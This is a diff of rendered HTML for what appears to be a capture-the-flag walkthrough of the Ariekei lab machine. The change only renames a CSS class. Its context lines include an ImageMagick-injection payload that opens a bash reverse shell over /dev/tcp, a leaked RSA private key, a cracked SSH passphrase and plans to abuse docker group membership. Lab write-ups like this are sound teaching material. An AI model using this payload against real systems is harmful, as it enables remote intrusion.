@@ -196,7 +196,7 @@ Apache/2.2.22 <span class="o">(</span>Debian<span class="o">)</span> Server at b
 viewbox 0 0 640 480
 fill <span class="s1">'url(https://"|setsid /bin/bash -i&gt;/dev/tcp/your ip/4444 0&lt;&amp;1 2&gt;&amp;1")'</span>ms
 pop graphic-context
-</pre></table></code></div></div><p>We then upload this with a listener on port 4444 and we get a shell back as root@calvin.</p><p><code class="language-console highlighter-rouge"><span class="go">cat /proc/1/group</span></code> shows that we are inside a doker container. This is worth noting for later.</p><p>We then head to enumerate files and we find something in <code class="language-console highlighter-rouge"><span class="go">/common</span></code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>We then upload this with a listener on port 4444 and we get a shell back as root@calvin.</p><p><code class="language-terminal highlighter-rouge"><span class="go">cat /proc/1/group</span></code> shows that we are inside a doker container. This is worth noting for later.</p><p>We then head to enumerate files and we find something in <code class="language-terminal highlighter-rouge"><span class="go">/common</span></code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -342,7 +342,7 @@ oNyMkwKBgQCCCVKHRFC7na/8qMwuHEb6uRfsQV81pna5mLi55PV6RHxnoZ2wOdTA
 jFhkdTVmzkkP62Yxd+DZ8RN+jOEs+cigpPjlhjeFJ+iN7mCZoA7UW/NeAR1GbjOe
 BJBoz1pQBtLPQSGPaw+x7rHwgRMAj/LMLTI46fMFAWXB2AzaHHDNPg<span class="o">==</span>
 <span class="nt">-----END</span> RSA PRIVATE KEY-----
-</pre></table></code></div></div><p>We find the private key for the user!</p><p>We give this appropriate perms with <code class="language-console highlighter-rouge"><span class="go">chmod 600 id_rsa</span></code> and then we ssh into the box as erza. Another user in a docker container(you can see where this is going ahah).</p><p><code class="language-console highlighter-rouge"><span class="go">ssh -i id_rsa root@10.10.10.65 -p 1022</span></code> - we are using ssh on port 1022 instead of 22 as it didnt work on 22.</p><p>We enumerate files and find a config file in <code class="language-console highlighter-rouge"><span class="go">/common/contatiners/waf-live</span></code> it has the following contents:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>We find the private key for the user!</p><p>We give this appropriate perms with <code class="language-terminal highlighter-rouge"><span class="go">chmod 600 id_rsa</span></code> and then we ssh into the box as erza. Another user in a docker container(you can see where this is going ahah).</p><p><code class="language-terminal highlighter-rouge"><span class="go">ssh -i id_rsa root@10.10.10.65 -p 1022</span></code> - we are using ssh on port 1022 instead of 22 as it didnt work on 22.</p><p>We enumerate files and find a config file in <code class="language-terminal highlighter-rouge"><span class="go">/common/contatiners/waf-live</span></code> it has the following contents:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -434,7 +434,7 @@ Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span
 purple1          <span class="o">(</span>id_rsa<span class="o">)</span>
 1g 0:00:00:07 DONE <span class="o">(</span>2020-06-14 05:11<span class="o">)</span> 0.1394g/s 2000Kp/s 2000Kc/s 2000KC/sa6_123..<span class="k">*</span>7¡Vamos!
 Session completed
-</pre></table></code></div></div><p>And we got a password! <code class="language-console highlighter-rouge"><span class="go">purple1</span></code></p><p>We then ssh as the user <code class="language-console highlighter-rouge"><span class="go">spanishdancer</span></code>(the home dir of where we found the ssh key in belonged to this user)</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>And we got a password! <code class="language-terminal highlighter-rouge"><span class="go">purple1</span></code></p><p>We then ssh as the user <code class="language-terminal highlighter-rouge"><span class="go">spanishdancer</span></code>(the home dir of where we found the ssh key in belonged to this user)</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -478,7 +478,7 @@ spanishdancer@ariekei:~$ ls
 content  user.txt
 spanishdancer@ariekei:~$ cat user.txt
 ff0bca827a5f660f6d35df7481e5f216
-</span></pre></table></code></div></div><p>Running <code class="language-console highlighter-rouge"><span class="go">id</span></code> confirms that the user is part of a docker group, we will see if we can exploit this.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</span></pre></table></code></div></div><p>Running <code class="language-terminal highlighter-rouge"><span class="go">id</span></code> confirms that the user is part of a docker group, we will see if we can exploit this.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
